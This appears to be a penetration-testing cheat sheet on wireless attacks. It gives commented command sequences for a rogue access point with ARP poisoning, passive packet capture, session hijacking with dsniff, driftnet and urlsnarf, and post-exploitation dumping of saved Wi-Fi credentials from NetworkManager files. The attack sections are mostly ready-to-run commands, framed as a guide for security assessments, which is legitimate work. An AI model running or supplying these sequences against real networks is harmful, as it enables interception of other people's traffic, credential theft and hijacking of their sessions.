## Man-in-the-Middle attack
```bash
Description:
This attack sets up a rogue access point with the same SSID as a legitimate one,
tricking clients into connecting. Once connected, the attacker can intercept, modify,
or redirect traffic. Use during security assessments to evaluate a network's resistance
to rogue APs and traffic interception risks. It demonstrates the risks of trusting
unsecured or spoofed access points and the importance of certificate pinning, VPNs,
and user awareness.
airmon-ng start wlan0                                                # Enable monitor mode on the wlan0 interface
airbase-ng -e RogueAP -c [channel] mon0                              # Create a fake AP named "RogueAP" on the specified channel
ifconfig at0 up                                                      # Bring up the virtual interface created by airbase-ng
dhcpd at0                                                            # Start DHCP server to assign IPs to clients connecting to at0
ifconfig at0 192.168.1.1 netmask 255.255.255.0                       # Set a static IP on the fake interface
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1      # Route traffic through the fake gateway
echo 1 > /proc/sys/net/ipv4/ip_forward                               # Enable IP forwarding to relay traffic
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE                 # Masquerade traffic from at0 to external network via eth0
ettercap -T -q -i at0 -M arp:remote // //                            # Launch ARP poisoning to intercept and sniff network traffic


```
## Wireless Eavesdropping
## Description:
## This passive attack involves capturing wireless packets in the air for later analysis.
## When to Use:
## Use during recon or to analyze open or poorly encrypted networks without disrupting them.
## Why:
## It reveals sensitive data or credentials transmitted in plaintext, misconfigured encryption, and device behavior.

```bash
airmon-ng start wlan0          # Enable monitor mode on the wireless card
airodump-ng mon0              # View available wireless networks and clients
wireshark &                   # Launch Wireshark for real-time packet capture and analysis
# Then apply display filters like:
# http                     - To view unencrypted web traffic
# tcp.port==80             - To isolate standard HTTP port traffic
# wlan.fc.type_subtype==0x08 - To view Beacon frames


```
## Session Hijacking over Wireless
```bash
Description:
This attack captures session tokens, cookies, or credentials from unencrypted network traffic to hijack user sessions.

When to Use:
When users connect to insecure networks (e.g., public Wi-Fi), to demonstrate risks of non-HTTPS services.

Why:
To stress the importance of HTTPS, secure cookie flags, and encrypted transport layers.
airmon-ng start wlan0        # Enable monitor mode
airodump-ng mon0             # Discover nearby wireless traffic
driftnet -i mon0             # Intercept and display images being transmitted
dsniff -i mon0               # Capture passwords, session cookies, and credentials from sniffed traffic
urlsnarf -i mon0             # Log all URLs accessed by devices on the network


```
## Enumerating wireless security profiles
## Description:
## This involves identifying saved or auto-connect wireless profiles on a system, including previously connected networks and their credentials.

## When to Use:
## When analyzing client device configurations or performing post-exploitation data gathering.

## Why:
## It shows what networks a device connects to and can expose credentials or hint at physical locations.
```bash
nmcli dev wifi list                                      # List available networks and their security types
cat /etc/NetworkManager/system-connections/*             # Display saved wireless profiles and potential credentials

```